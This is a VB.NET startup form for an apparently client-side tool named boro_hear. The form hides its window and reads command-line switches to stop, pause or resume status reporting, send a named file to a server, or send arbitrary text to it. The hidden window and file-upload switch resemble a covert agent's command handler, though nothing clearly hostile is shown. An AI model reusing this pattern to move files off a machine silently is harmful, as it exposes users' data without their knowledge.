Imports boro_hear.Boro_Comm.Cliente
Public Class Init
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Me.Hide()
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Me.Hide()
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                If parameter.ToLower Like "*/stop*" Then
                    End
                ElseIf parameter.ToLower Like "*/pause*" Then
                    sendStatus = False
                ElseIf parameter.ToLower Like "*/resume*" Then
                    sendStatus = True
                ElseIf parameter.ToLower Like "*/filesend*" Then
                    SendFileToServer(parameter.Replace("/filesend", Nothing).TrimStart())
                Else
                    SendContentToServer(parametros)
                End If
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@Init", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
End Class